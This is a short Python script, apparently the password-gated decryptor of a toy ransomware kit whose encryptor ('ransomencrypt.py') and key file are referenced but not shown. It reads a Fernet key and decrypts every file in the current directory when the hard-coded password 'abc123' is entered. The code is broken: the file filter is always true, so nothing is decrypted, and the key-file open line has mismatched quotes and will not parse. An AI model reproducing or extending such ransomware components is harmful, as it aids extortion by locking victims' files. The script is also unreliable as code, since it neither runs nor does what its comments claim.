#Import operating system library and Fernet (a symmetric encryption method)
from importlib.resources import contents
import os
from cryptography.fernet import Fernet

#Create empty list to store files in
files = []

#Create for loop to discover all files (not directories) in the current directory and add them to the files list
for file in os.listdir():
    #Filter out ransomencrypt.py and thekey.key so they are not added to the files list and encryped
    if file == "ransomencrypt.py" or "thekey.key" or "ransomdecrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#Open and read file with generated key and set it to variable "secretkey"
with open("thekey.key, "rb) as key:
    secretkey = key.read()

#Fun stuff: Ask user to input password to unlock files
password = "abc123"

prompt = input("Password: ")

#Decrypt all files in files list if given correct password
if prompt == password:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

